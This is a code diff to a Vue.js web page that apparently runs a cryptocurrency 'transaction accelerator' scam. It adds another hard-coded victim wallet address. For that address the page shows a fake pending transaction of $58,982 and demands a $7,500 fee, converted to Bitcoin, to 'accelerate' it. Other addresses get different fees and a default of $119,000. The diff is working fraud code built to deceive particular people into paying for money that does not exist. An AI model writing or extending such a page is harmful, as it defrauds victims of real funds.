@@ -46,9 +46,13 @@
           <p class="action-text-part-text-1" v-if="this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'">
             Transaction Pending Confirmation! To accelerate your transaction of $100,020, please click Proceed and follow the steps displayed.
           </p>
+          <p class="action-text-part-text-1" v-if="this.inputValue === '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4'">
+            Transaction Pending Confirmation! To accelerate your transaction of  $58,982, please click Proceed and follow the steps displayed.
+          </p>
           <p class="action-text-part-text-1"
              v-if="this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
      this.inputValue !== '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' &&
+          this.inputValue !== '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' &&
      this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
           >Transaction Pending confirmation! To accelerate your Transaction click proceed and
             follow the steps displayed</p>
@@ -84,9 +88,14 @@
             <p class="price-container-text-1">Price:</p>
             <p class="price-container-text-2">$0</p>
           </div>
+          <div v-if="this.inputValue === '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4'" class="price-container-1">
+            <p class="price-container-text-1">Price:</p>
+            <p class="price-container-text-2">$7,500</p>
+          </div>
           <div
               v-if="this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
      this.inputValue !== '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' &&
+          this.inputValue !== '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' &&
      this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
               class="price-container-1">
             <p class="price-container-text-1">Price:</p>
@@ -100,6 +109,7 @@
             <div v-else>
               <p v-if="this.inputValue === '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' ||
      this.inputValue === '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' ||
+          this.inputValue === '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' ||
      this.inputValue === '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5'"
                   class="price-container-text-3" @click="showDialog5">Submit Order</p>
               <p v-else  class="price-container-text-3" @click="showDialog">Submit Order</p>
@@ -509,8 +519,15 @@ export default {
         console.log(this.inputValue3);
         const usdAmount = parseFloat(this.inputValue3);
         this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
-      }  if (this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
+      }if (this.inputValue === "0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4") {
+        // If the address matches, set inputValue3 to 5000
+        this.inputValue3 = 7500;
+        console.log(this.inputValue3);
+        const usdAmount = parseFloat(this.inputValue3);
+        this.inputValue2 = (usdAmount / this.bitcoinRate).toFixed(8); // Convert to Bitcoin and round to 8 decimal places
+      }if (this.inputValue !== '0x9f8d5a2c3b4a1e7b09b122fd4b89ed7a059ed48d9c24e44a5f6a7d98c123cfad' &&
           this.inputValue !== '0x3f5e2d1a8c9b04d2fa80123c5d93b7f4ad7c8f9e1b6a3b9c0d5f3e3d7a4a1e6' &&
+          this.inputValue !== '0x3a4f9d2b1e8c7a9d4e1b12c7f5a8a6b9c1f7a2d3d4e5f2b7a6c8f1d9b2d3c4' &&
           this.inputValue !== '0x9b7c4f2e1d8a59c3bf071db2a6e23f1b5d8f9b0e2c7a4f9d2b0c1e8c7b4f3c5') {
         // Proceed with the conversion using the normal inputValue3
         this.inputValue3 = 119000;
